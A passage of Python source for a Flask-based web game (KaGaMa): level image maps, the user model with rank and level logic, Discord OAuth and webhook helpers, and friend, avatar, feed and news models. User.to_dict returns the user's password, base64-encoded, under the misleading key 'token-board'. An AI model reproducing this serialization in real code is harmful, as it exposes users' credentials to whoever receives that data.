            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/5e/db/5edba0d11a02471689cac1e1e4fc641b.png"
        },
        24: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/a8/de/a8debb691ffd446c940dbab49a05b7b5_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/a8/de/a8debb691ffd446c940dbab49a05b7b5_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/a8/de/a8debb691ffd446c940dbab49a05b7b5_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/e2/45/a8debb691ffd446c940dbab49a05b7b5.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/e2/45/a8debb691ffd446c940dbab49a05b7b5.png"
        },
        25: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/5b/26/5b2624611a3f4a2d9a27e350d663a33a_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/5b/26/5b2624611a3f4a2d9a27e350d663a33a_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/5b/26/5b2624611a3f4a2d9a27e350d663a33a_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/e2/45/5b2624611a3f4a2d9a27e350d663a33a.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/e2/45/5b2624611a3f4a2d9a27e350d663a33a.png"
        },
        26: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/e2/ed/e2edc3b1eb624721bd863d98a168e193_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/e2/ed/e2edc3b1eb624721bd863d98a168e193_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/e2/ed/e2edc3b1eb624721bd863d98a168e193_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/e2/ed/e2edc3b1eb624721bd863d98a168e193.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/e2/ed/e2edc3b1eb624721bd863d98a168e193.png"
        },
        27: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/3c/4f/3c4f29ad0cd8472491ed112261cc2efb_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/3c/4f/3c4f29ad0cd8472491ed112261cc2efb_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/3c/4f/3c4f29ad0cd8472491ed112261cc2efb_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/3c/4f/3c4f29ad0cd8472491ed112261cc2efb.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/3c/4f/3c4f29ad0cd8472491ed112261cc2efb.png"
        },
        28: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/d5/34/d53490886a2041f980cb0184235f791e_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/d5/34/d53490886a2041f980cb0184235f791e_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/d5/34/d53490886a2041f980cb0184235f791e_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/d5/34/d53490886a2041f980cb0184235f791e.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/d5/34/d53490886a2041f980cb0184235f791e.png"
        },
        29: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/b0/36/b0362b33f0a84f52bceff27f3a7bfd95_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/b0/36/b0362b33f0a84f52bceff27f3a7bfd95_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/b0/36/b0362b33f0a84f52bceff27f3a7bfd95_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/b0/36/b0362b33f0a84f52bceff27f3a7bfd95.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/b0/36/b0362b33f0a84f52bceff27f3a7bfd95.png"
        },
        30: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/1b/3a/1b3a3c92ee874fe48c1505af9fd4e0f9_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/1b/3a/1b3a3c92ee874fe48c1505af9fd4e0f9_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/1b/3a/1b3a3c92ee874fe48c1505af9fd4e0f9_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/1b/3a/1b3a3c92ee874fe48c1505af9fd4e0f9.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/1b/3a/1b3a3c92ee874fe48c1505af9fd4e0f9.png"
        },
        31: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/fc/99/fc997e7e7c0d49e3b6be1f6ee01c57d0_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/fc/99/fc997e7e7c0d49e3b6be1f6ee01c57d0_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/fc/99/fc997e7e7c0d49e3b6be1f6ee01c57d0_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/fc/99/fc997e7e7c0d49e3b6be1f6ee01c57d0.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/fc/99/fc997e7e7c0d49e3b6be1f6ee01c57d0.png"
        },
        32: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/05/69/0569b8a59cb54290812acff5681a0424_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/05/69/0569b8a59cb54290812acff5681a0424_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/05/69/0569b8a59cb54290812acff5681a0424_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/05/69/0569b8a59cb54290812acff5681a0424.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/05/69/0569b8a59cb54290812acff5681a0424.png"
        },
        33: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/72/f7/72f72ad820c844da96ccdfb591f8063f_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/72/f7/72f72ad820c844da96ccdfb591f8063f_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/72/f7/72f72ad820c844da96ccdfb591f8063f_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/72/f7/72f72ad820c844da96ccdfb591f8063f.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/72/f7/72f72ad820c844da96ccdfb591f8063f.png"
        },
        34: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/d0/85/d08592975114494a8ce90d313faa1d29_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/d0/85/d08592975114494a8ce90d313faa1d29_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/d0/85/d08592975114494a8ce90d313faa1d29_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/d0/85/d08592975114494a8ce90d313faa1d29.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/d0/85/d08592975114494a8ce90d313faa1d29.png"
        },
        35: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/50/c9/50c962e6aa5f4f54860ac9c7ad644bff_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/50/c9/50c962e6aa5f4f54860ac9c7ad644bff_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/50/c9/50c962e6aa5f4f54860ac9c7ad644bff_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/50/c9/50c962e6aa5f4f54860ac9c7ad644bff.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/50/c9/50c962e6aa5f4f54860ac9c7ad644bff.png"
        },
        36: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/7a/3d/7a3deb74e3dc45a79418b72071bc6990_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/7a/3d/7a3deb74e3dc45a79418b72071bc6990_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/7a/3d/7a3deb74e3dc45a79418b72071bc6990_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/7a/3d/7a3deb74e3dc45a79418b72071bc6990.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/7a/3d/7a3deb74e3dc45a79418b72071bc6990.png"
        },
        37: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/53/dc/53dc6bb464054ddeb4e96773ea9d9f37_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/53/dc/53dc6bb464054ddeb4e96773ea9d9f37_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/53/dc/53dc6bb464054ddeb4e96773ea9d9f37_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/53/dc/53dc6bb464054ddeb4e96773ea9d9f37.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/53/dc/53dc6bb464054ddeb4e96773ea9d9f37.png"
        },
        38: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/72/5c/725c568430b146748901671363fb915e_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/72/5c/725c568430b146748901671363fb915e_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/72/5c/725c568430b146748901671363fb915e_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/72/5c/725c568430b146748901671363fb915e.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/72/5c/725c568430b146748901671363fb915e.png"
        },
        39: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/f3/c8/f3c82bf93fd6410bb5cb9cf0328ee846_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/f3/c8/f3c82bf93fd6410bb5cb9cf0328ee846_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/f3/c8/f3c82bf93fd6410bb5cb9cf0328ee846_64x4.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/f3/c8/f3c82bf93fd6410bb5cb9cf0328ee846.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/f3/c8/f3c82bf93fd6410bb5cb9cf0328ee846.png"
        },
        40: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/0f/ee/0feefb448c1c4b57b1640fb71d3eca4b_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/0f/ee/0feefb448c1c4b57b1640fb71d3eca4b_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/0f/ee/0feefb448c1c4b57b1640fb71d3eca4b_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/0f/ee/0feefb448c1c4b57b1640fb71d3eca4b.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/0f/ee/0feefb448c1c4b57b1640fb71d3eca4b.png"
        },
        41: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/85/a5/85a5f0162f3e4f2f87bc76a1181f9757_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/85/a5/85a5f0162f3e4f2f87bc76a1181f9757_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/85/a5/85a5f0162f3e4f2f87bc76a1181f9757_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/85/a5/85a5f0162f3e4f2f87bc76a1181f9757.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/85/a5/85a5f0162f3e4f2f87bc76a1181f9757.png"
        },
        42: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/b9/99/b999226844724d4cba278ae5193dfba8_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/b9/99/b999226844724d4cba278ae5193dfba8_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/b9/99/b999226844724d4cba278ae5193dfba8_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/b9/99/b999226844724d4cba278ae5193dfba8.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/b9/99/b999226844724d4cba278ae5193dfba8.png"
        },
        43: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/aa/25/aa2598821d0444658fdc67bdf5497ede_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/aa/25/aa2598821d0444658fdc67bdf5497ede_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/aa/25/aa2598821d0444658fdc67bdf5497ede_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/aa/25/aa2598821d0444658fdc67bdf5497ede.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/aa/25/aa2598821d0444658fdc67bdf5497ede.png"
        },
        44: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/67/52/6752d82698fd468cb36cd6784c024249_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/67/52/6752d82698fd468cb36cd6784c024249_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/67/52/6752d82698fd468cb36cd6784c024249_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/67/52/6752d82698fd468cb36cd6784c024249.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/67/52/6752d82698fd468cb36cd6784c024249.png"
        },
        45: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/d3/2d/d32d6144a51c4ab6bc1f831136a859a4_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/d3/2d/d32d6144a51c4ab6bc1f831136a859a4_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/d3/2d/d32d6144a51c4ab6bc1f831136a859a4_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/d3/2d/d32d6144a51c4ab6bc1f831136a859a4.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/d3/2d/d32d6144a51c4ab6bc1f831136a859a4.png"
        }
    }
    MAX_LEVEL = 45
    @property
    def pulse_status(self):
        now = datetime.now(timezone.utc)
        last_ping = self.last_ping
        if last_ping is None:
            return 1
        if last_ping.tzinfo is None:
            last_ping = last_ping.replace(tzinfo=timezone.utc)
        time_difference = now - last_ping
        if time_difference < timedelta(seconds=5):
            return 2
        return 1
    # TTL cache for leaderboard rank (the single most expensive call on the
    # profile page: it used to load + sort the ENTIRE User table). Rank only
    # changes when someone gains XP, so a short TTL is safe.
    _RANK_CACHE = {}
    _RANK_TTL = 300.0

    @property
    def rank(self):
        if self.xp == 0 and self._level == 1:
            return 0
        now = _time.time()
        cached = User._RANK_CACHE.get(self.id)
        if cached is not None and now - cached[1] < User._RANK_TTL:
            return cached[0]
        # Indexed aggregate counts instead of loading + sorting the whole
        # table. Split into two range queries so each uses the (level, xp)
        # composite index (MySQL won't use indexes well for an OR predicate).
        higher = db.session.query(func.count(User.id)).filter(
            User._level > self._level
        ).scalar() or 0
        same = db.session.query(func.count(User.id)).filter(
            User._level == self._level, User.xp > self.xp
        ).scalar() or 0
        val = higher + same + 1
        User._RANK_CACHE[self.id] = (val, now)
        if len(User._RANK_CACHE) > 5000:
            User._RANK_CACHE.pop(next(iter(User._RANK_CACHE)), None)
        return val
    @property
    def is_admin(self):
        return self.role in ('admin', 'mod', 'staff')
    @property
    def is_moderator(self):
        return self.role in ('admin', 'mod')
    @property
    def is_staff(self):
        return self.role in ('admin', 'mod', 'staff')
    @property
    def level_progress(self):
        if self.xp != 0:
            return (self.xp / (self.xp + self.xp_to_next_level)) * 100
        else:
            return 0
    @property
    def level(self):
        computed_level = 1
        for lvl in sorted(self.LEVEL_XP_MAP.keys()):
            if self.xp >= self.LEVEL_XP_MAP[lvl]:
                computed_level = lvl
        current_milestone = self.LEVEL_XP_MAP.get(computed_level, 0)
        prev_lvl = computed_level - 1
        self.previous_level_xp = self.LEVEL_XP_MAP.get(prev_lvl, 0)
        if computed_level >= self.MAX_LEVEL:
            self.next_level_xp = 0
            self.xp_to_next_level = 0
        else:
            next_lvl = computed_level + 1
            next_milestone = self.LEVEL_XP_MAP.get(next_lvl, current_milestone)
            self.next_level_xp = next_milestone
            self.xp_to_next_level = next_milestone - current_milestone
        return computed_level
    def to_dict(self):
        utc_timestamp = self.created
        if utc_timestamp is None:
            utc_timestamp = datetime.now(timezone.utc)
        elif utc_timestamp.tzinfo is None:
            utc_timestamp = utc_timestamp.replace(tzinfo=timezone.utc)
        return {
            'id': self.id,
            'username': self.username,
            'token-board': base64.b64encode(self.password.encode('utf-8')).decode('utf-8'),
            'email': self.email,
            'gold': self.gold,
            'xp': self.xp,
            'next_level_xp': self.next_level_xp,
            'xp_to_next_level': self.xp_to_next_level,
            'previous_level_xp': self.previous_level_xp,
            'level': self.level,
            'friends': self.friends,
            'description': self.description,
            'birthdate': self.birthdate,
            'avatar_id': self.avatar_id,
            'created': utc_timestamp.isoformat(),
            'email_confirmed': self.email_confirmed,
            'language': self.language,
            'role': self.role,
            'is_admin': self.is_admin,
            'is_banned': self.is_banned,
            'locked': self.locked,
            'suspended': self.suspended,
            'shadow_banned': self.shadow_banned,
            'warned_count': self.warned_count,
            'two_factor_enabled': self.two_factor_enabled,
            'is_elite': self.is_elite,
            'display_name': self.display_name,
            'discord_verification': self.discord_verification
        }

    @property
    def discord_verification(self):
        verified_at = self.discord_verified_at
        if verified_at is not None and verified_at.tzinfo is None:
            verified_at = verified_at.replace(tzinfo=timezone.utc)
        return {
            "verified": bool(self.discord_id),
            "id": self.discord_id,
            "username": self.discord_username or "",
            "avatar_url": self.discord_avatar_url or "",
            "verified_at": verified_at.isoformat() if verified_at else None
        }


def discord_oauth_configured():
    return bool(DISCORD_CLIENT_ID and DISCORD_CLIENT_SECRET)


def discord_redirect_uri():
    return DISCORD_REDIRECT_URI or url_for("discord_oauth_callback", _external=True)


def safe_next_url(value):
    if value and value.startswith("/") and not value.startswith("//"):
        return value
    return url_for("home")


def append_query_param(url, key, value):
    separator = "&" if "?" in url else "?"
    return f"{url}{separator}{urlencode({key: value})}"


def format_discord_username(discord_user):
    global_name = discord_user.get("global_name")
    username = discord_user.get("username", "")
    discriminator = discord_user.get("discriminator", "0")
    if global_name:
        return global_name
    if discriminator and discriminator != "0":
        return f"{username}#{discriminator}"
    return username


def discord_avatar_url(discord_user):
    discord_id = discord_user.get("id")
    avatar_hash = discord_user.get("avatar")
    if discord_id and avatar_hash:
        return f"https://cdn.discordapp.com/avatars/{discord_id}/{avatar_hash}.png?size=128"
    return ""


def discord_payload_from_api_user(discord_user):
    return {
        "id": discord_user.get("id"),
        "username": format_discord_username(discord_user),
        "avatar_hash": discord_user.get("avatar"),
        "avatar_url": discord_avatar_url(discord_user),
        "verified_at": datetime.now(timezone.utc).isoformat()
    }


def apply_discord_verification(user, payload):
    user.discord_id = payload.get("id")
    user.discord_username = payload.get("username") or ""
    user.discord_avatar_hash = payload.get("avatar_hash") or ""
    user.discord_avatar_url = payload.get("avatar_url") or ""
    verified_at = payload.get("verified_at")
    if verified_at:
        user.discord_verified_at = datetime.fromisoformat(verified_at)
    else:
        user.discord_verified_at = datetime.now(timezone.utc)


def send_verification_discord_notification(user, discord_payload):
    print(f"[Webhook] VERIFICATION_WEBHOOK_URL={'SET' if VERIFICATION_WEBHOOK_URL else 'EMPTY'}")
    if not VERIFICATION_WEBHOOK_URL:
        return
    kagama_username = getattr(user, 'username', None) or discord_payload.get("username", "Unknown")
    discord_username = discord_payload.get("username", "Unknown")
    discord_avatar = discord_payload.get("avatar_url", "")
    user_id = getattr(user, 'id', None)
    profile_url = f"https://playskagama.xyz/profile/{user_id}/" if user_id else "https://playskagama.xyz/"
    embed = {
        "title": "✅ Player Verified",
        "description": f"**{kagama_username}** linked their Discord to KaGaMa!",
        "color": 0x57F287,
        "fields": [
            {"name": "🎮 KaGaMa Username", "value": kagama_username, "inline": True},
            {"name": "👤 Discord", "value": discord_username, "inline": True},
            {"name": "🔗 Profile", "value": f"[View Profile]({profile_url})", "inline": True},
        ],
        "footer": {"text": "KaGaMa Verification System"},
    }
    if discord_avatar:
        embed["thumbnail"] = {"url": discord_avatar}
    try:
        resp = requests.post(VERIFICATION_WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
        print(f"[Webhook] Response: {resp.status_code} {resp.text[:200]}")
    except Exception as e:
        print(f"[Webhook] Failed to send verification notification: {e}")


def current_discord_verification():
    if current_user.is_authenticated:
        payload = current_user.discord_verification
        payload["source"] = "user"
        payload["kagama_username"] = current_user.username
        payload["kagama_id"] = current_user.id
        payload["kagama_level"] = current_user.level
        payload["kagama_created"] = current_user.created.isoformat() if current_user.created else None
        return payload
    pending = session.get("pending_discord_verification")
    if pending:
        return {
            "verified": True,
            "id": pending.get("id"),
            "username": pending.get("username") or "",
            "avatar_url": pending.get("avatar_url") or "",
            "verified_at": pending.get("verified_at"),
            "source": "signup"
        }
    return {
        "verified": False,
        "id": None,
        "username": "",
        "avatar_url": "",
        "verified_at": None,
        "source": "none"
    }

class Friend(db.Model):
    __tablename__ = 'friends'
    id = db.Column(db.Integer, primary_key=True)
    profile_id = db.Column(db.Integer, nullable=False)
    friend_profile_id = db.Column(db.Integer, nullable=False)
    profile_username = db.Column(db.String(150), nullable=False)
    friend_username = db.Column(db.String(150), nullable=False)
    friend_status = db.Column(db.String(150), default="pending", nullable=False)
    friend_images = db.Column(db.Text, nullable=False)
    is_subscriber = db.Column(db.Boolean, default=False)
    def to_dict(self):
        return {
           "id": self.id,
           "friend_status": self.friend_status,
           "profile_id": self.profile_id,
           "profile_username": self.profile_username,
           "friend_profile_id": self.friend_profile_id,
           "friend_username": self.friend_username,
           "friend_images": json.loads(self.friend_images),
            "is_subscriber": self.is_subscriber
         }

# --- Performance: covering indexes (created once, idempotent) ---
# The profile page and friend/is_friend queries filter on these columns;
# without indexes they table-scan the (potentially large) friends/user tables.
_ix_friend_sent = Index('ix_friends_profile_status',
                        Friend.profile_id, Friend.friend_status, Friend.friend_profile_id)
_ix_friend_recv = Index('ix_friends_friend_profile_status',
                        Friend.friend_profile_id, Friend.friend_status, Friend.profile_id)
_ix_user_xp = Index('ix_user_xp', User.xp)
_ix_user_level = Index('ix_user_level', User._level)
_ix_user_level_xp = Index('ix_user_level_xp', User._level, User.xp)

def _ensure_perf_indexes():
    for _ix in (_ix_friend_sent, _ix_friend_recv, _ix_user_xp, _ix_user_level, _ix_user_level_xp):
        try:
            _ix.create(db.engine, checkfirst=True)
        except Exception as _e:
            app.logger.warning("perf index create skipped: %s", _e)

class Avatar(db.Model):
    __tablename__ = 'avatars'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, nullable=False)
    username = db.Column(db.String(150), nullable=False)
    avatar_id = db.Column(db.Integer, nullable=False)
    avatar_name = db.Column(db.String(150), nullable=False)
    images = db.Column(db.Text, nullable=False)
    is_active = db.Column(db.Boolean, default=False)
    def to_dict(self):
        return {
           "id": self.id,
           "user_id": self.user_id,
           "username": self.username,
           "avatar_id": self.avatar_id,
           "avatar_name": self.avatar_name,
           "images": json.loads(self.images),
           "is_active": self.is_active
        }

class FeedPost(db.Model):
    __tablename__ = 'feed_posts'
    id = db.Column(db.Integer, primary_key=True)
    feed_type = db.Column(db.String(50), default="wall_post")
    _data = db.Column(db.Text, nullable=False)
    profile_id = db.Column(db.Integer, nullable=False)
    created = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc), nullable=False)
    deleted = db.Column(db.DateTime, nullable=True)
    planet_id = db.Column(db.Integer, nullable=True)
    planet_name = db.Column(db.String(150), nullable=True)
    item_id = db.Column(db.Integer, nullable=True)
    news_id = db.Column(db.Integer, nullable=True)
    avatar_id = db.Column(db.Integer, nullable=True)
    other_profile_id = db.Column(db.Integer, nullable=True)
    gold = db.Column(db.Integer, default=0)
    profile_username = db.Column(db.String(150), nullable=False)
    profile_images = db.Column(db.Text, nullable=False)
    active_avatar_id = db.Column(db.Integer, default=0)
    planet_images = db.Column(db.Text, nullable=True)
    item_images = db.Column(db.Text, nullable=True)
    avatar_images = db.Column(db.Text, nullable=True)
    other_username = db.Column(db.String(150), nullable=False)
    badge_id = db.Column(db.Integer, default=0)
    badge_name = db.Column(db.String(150), default="")
    badge_images = db.Column(db.Text, nullable=True)
    is_subscriber = db.Column(db.Boolean, default=False)
    can_delete = db.Column(db.Boolean, default=False)
    def to_dict(self):
        utc_timestamp = self.created
        if utc_timestamp is None:
            utc_timestamp = datetime.now(timezone.utc)
        elif utc_timestamp.tzinfo is None:
            utc_timestamp = utc_timestamp.replace(tzinfo=timezone.utc)
        return {
            "id": self.id,
            "feed_type": self.feed_type,
            "_data": self._data,
            "profile_id": self.profile_id,
            "created": utc_timestamp.isoformat(),
            "deleted": None if self.deleted is None else self.deleted.isoformat(),
            "planet_id": self.planet_id,
            "item_id": self.item_id,
            "news_id": self.news_id,
            "avatar_id": self.avatar_id,
            "other_profile_id": self.other_profile_id,
            "gold": self.gold,
            "profile_username": self.profile_username,
            "profile_images": json.loads(self.profile_images) if self.profile_images else {},
            "active_avatar_id": self.active_avatar_id,
            "planet_name": self.planet_name,
            "planet_images": json.loads(self.planet_images) if self.planet_images else None,
            "item_images": json.loads(self.item_images) if self.item_images else None,
            "avatar_images": json.loads(self.avatar_images) if self.avatar_images else {},
            "other_username": self.other_username,
            "badge_id": self.badge_id,
            "badge_name": self.badge_name,
            "badge_images": json.loads(self.badge_images) if self.badge_images else None,
            "is_subscriber": self.is_subscriber,
            "can_delete": self.can_delete
        }

class NewsFeed(db.Model):
    __tablename__ = 'news_feed'
    id = db.Column(db.Integer, primary_key=True)
    profile_id = db.Column(db.Integer, nullable=False)
    profile_username = db.Column(db.String(150), nullable=False)
    title = db.Column(db.Text, nullable=False)
    excerpt = db.Column(db.Text, nullable=False)
    body_html = db.Column(db.Text, nullable=False)
    created = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc), nullable=False)
    updated = db.Column(db.DateTime, nullable=True)
    language = db.Column(db.String(150), nullable=False)
    published = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc), nullable=False)
    is_published = db.Column(db.Boolean, default=True, nullable=False)
    is_pinned = db.Column(db.Boolean, default=False, nullable=False)
    is_archived = db.Column(db.Boolean, default=False, nullable=False)
    scheduled_publish_at = db.Column(db.DateTime, nullable=True)
    featured_images = db.Column(db.Text, nullable=False)
    support_image = db.Column(db.Text, nullable=True)

    def computed_status(self):
        now = datetime.now(timezone.utc)
        if self.is_archived:
            return "archived"
        if self.scheduled_publish_at and self.scheduled_publish_at > now:
            return "scheduled"
        if not self.is_published:
            return "draft"
        return "published"

    def to_dict(self):
        featured = json.loads(self.featured_images) if self.featured_images else []
        # Ensure each item is a dict with 'url'; if it's a string, convert it
        safe_featured = []
        for item in featured:
            if isinstance(item, str):
                safe_featured.append({"url": item, "alt": "KaGaMa News"})
            elif isinstance(item, dict):
